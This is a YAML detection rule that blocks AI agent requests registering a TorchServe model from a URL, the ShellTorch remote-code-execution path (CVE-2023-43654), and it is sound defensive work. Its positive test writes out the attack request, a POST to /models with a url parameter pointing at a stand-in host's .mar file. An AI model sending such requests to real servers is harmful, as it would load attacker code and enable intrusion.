    # ---------------------------------------------------------------- E2: TorchServe ShellTorch (spec §8.4)
    - id: SIG-0020
      name: TorchServe management API model registration from URL (ShellTorch, CVE-2023-43654)
      version: 1
      status: stable
      severity: critical
      type: http_request
      applies_to: [http_request]
      action: block
      # Default-open management API (port 8081): POST /models?url=… fetches a .mar from any URL and loads it (SSRF → RCE).
      # An agent registering a model is never legitimate, so any url= registration is a hard exclusion (C20).
      match: {method: POST, path_regex: '^/models/?$', query_has: [url]}
      metadata: {control: C20, owasp: ["ASI05", "LLM04:2026"], atlas: ["AML.T0049", "AML.T0132"], references: ["https://oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server", "https://nvd.nist.gov/vuln/detail/CVE-2023-43654"]}
      tests:
        positive: ["POST /models?url=http://198.51.100.7/ctrl_test.mar"]
        negative: ["GET /models", "POST /predictions/resnet18 {\"data\":\"CTRL_TEST\"}"]

